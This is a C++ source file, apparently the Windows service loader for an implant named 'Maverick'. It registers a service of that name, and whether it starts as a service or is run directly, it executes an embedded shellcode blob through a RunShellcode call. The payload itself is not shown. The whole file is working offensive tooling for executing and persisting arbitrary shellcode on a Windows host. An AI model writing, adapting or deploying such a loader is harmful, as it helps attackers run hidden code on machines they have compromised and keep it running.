#include <Maverick.h>
#include <Shellcode.h>

static SERVICE_STATUS        ServiceStatus       = {0};
static SERVICE_STATUS_HANDLE ServiceStatusHandle = NULL;

VOID WINAPI ServiceMain(ULONG argc, CHAR* argv);
VOID WINAPI ServiceCtrlHandler(ULONG Ctrl);
static VOID RunMaverick(VOID);

static VOID RunMaverick(VOID) {
    RunShellcode(Shellcode::Data, Shellcode::Size);
}

VOID WINAPI ServiceCtrlHandler(ULONG Ctrl) {
    switch (Ctrl) {
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            ServiceStatus.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
            return;
        case SERVICE_CONTROL_INTERROGATE:
        default:
            break;
    }
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
}

VOID WINAPI ServiceMain(ULONG argc, CHAR* argv) {
    ServiceStatusHandle = RegisterServiceCtrlHandlerW(
        L"Maverick", (LPHANDLER_FUNCTION)ServiceCtrlHandler);

    if (!ServiceStatusHandle)
        return;

    ServiceStatus.dwServiceType             = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState            = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted        = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode           = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint              = 0;
    ServiceStatus.dwWaitHint                = 0;

    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);

    RunMaverick();

    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
}

auto WINAPI WinMain(
    _In_ HINSTANCE Instance,
    _In_ HINSTANCE PrevInstance,
    _In_ LPSTR     CommandLine,
    _In_ INT32     ShowCmd
) -> INT32 {
    SERVICE_TABLE_ENTRYW ServiceTable[] = {
        { (LPWSTR)L"Maverick", (LPSERVICE_MAIN_FUNCTIONW)ServiceMain },
        { nullptr, nullptr }
    };

    if (!StartServiceCtrlDispatcherW(ServiceTable)) {
        RunMaverick();
    }
    return 0;
}
